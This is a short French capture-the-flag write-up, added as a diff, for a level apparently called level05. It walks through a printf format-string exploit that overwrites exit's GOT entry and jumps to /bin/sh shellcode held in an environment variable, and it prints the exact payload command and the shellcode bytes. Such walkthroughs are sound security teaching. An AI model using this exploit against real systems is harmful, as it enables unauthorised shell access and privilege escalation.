@@ -1,0 +1,13 @@
+On disas le binaire, et arrivons a re-ecrire le code source sans trop de soucis.
+On voit rapidement que le code contient un printf vulnerable : nous commencons a sonder la stack avec des %x.
+
+Au 10eme %x, nous voyons que nous retrouvons ce que nous avons ecrit au debut du printf: nous savons donc dans quel offset il faut ecrire. Nous decison de re-ecrire l'adresse de destination de exit dans la GOT, que l'on recupere grace a gdb.
+
+Nous decidons d'injecter un shellcode dans une variable d'environement, puis nous recuperons l'adresse de la variable d'environnement grace au fichier getenvvar.c qui se trouve dans le dossier ressources.
+
+Il ne nous reste plus qu'a calculer la longuer des bytes a imprimer afin d'ecrire les nombres corrects dans grace au flag %hm.
+Cela nous donne:
+python -c 'print("\xe0\x97\x04\x08\xe2\x97\x04\x08" + "%57271x%10$hn%8256x%11$hn")' > /tmp/big
+
+Et enfin, en prenant le soin d'avoir un env le plus vide possible:
+cat /tmp/big - | env - S=$(python -c 'print("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")') /home/users/level05/level05
